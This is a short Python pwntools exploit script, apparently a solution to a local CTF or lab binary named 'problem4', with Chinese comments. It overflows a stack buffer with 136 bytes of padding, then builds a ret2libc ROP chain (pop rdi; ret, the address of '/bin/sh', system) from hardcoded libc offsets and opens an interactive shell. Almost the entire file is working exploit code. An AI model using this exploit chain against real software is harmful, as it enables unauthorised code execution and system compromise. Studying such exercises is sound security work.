# solve4.py
from pwn import *

# --- 配置区 (已根据你的系统信息填写完毕) ---
LIBC_BASE_ADDR = 0x7ffff7c00000    # 你在 GDB 中找到的 libc 基地址
POP_RDI_OFFSET = 0x10f78b         # 你在 libc 中找到的 "pop rdi ; ret" 偏移量
SYSTEM_OFFSET = 0x58750           # 你找到的 system 偏移量
BINSH_OFFSET = 0x1cb42f           # 你找到的 "/bin/sh" 偏移量

# --- 攻击逻辑 (无需修改) ---
p = process('./problem4')

# 从缓冲区开始到返回地址的距离是 128 (缓冲区) + 8 (旧rbp) = 136
OFFSET = 136

# 根据基地址和偏移量计算本次运行的真实地址
pop_rdi_addr = LIBC_BASE_ADDR + POP_RDI_OFFSET
system_addr = LIBC_BASE_ADDR + SYSTEM_OFFSET
binsh_addr = LIBC_BASE_ADDR + BINSH_OFFSET

log.info(f"Calculated pop rdi; ret address: {hex(pop_rdi_addr)}")
log.info(f"Calculated system address: {hex(system_addr)}")
log.info(f"Calculated '/bin/sh' address: {hex(binsh_addr)}")

# 构建单阶段 ROP 链，直接调用 system("/bin/sh")
rop_chain = b'A' * OFFSET
rop_chain += p64(pop_rdi_addr)   # 设置 system 的参数
rop_chain += p64(binsh_addr)      # 参数: "/bin/sh" 的地址
rop_chain += p64(system_addr)     # 调用 system

# 等待输入提示
p.recvuntil(b'your name:\n')

# 发送 payload
log.info("Sending payload to get shell...")
p.sendline(rop_chain)

# 程序现在会直接跳转到 system("/bin/sh")
log.success("PWNED! Switching to interactive mode.")
p.interactive()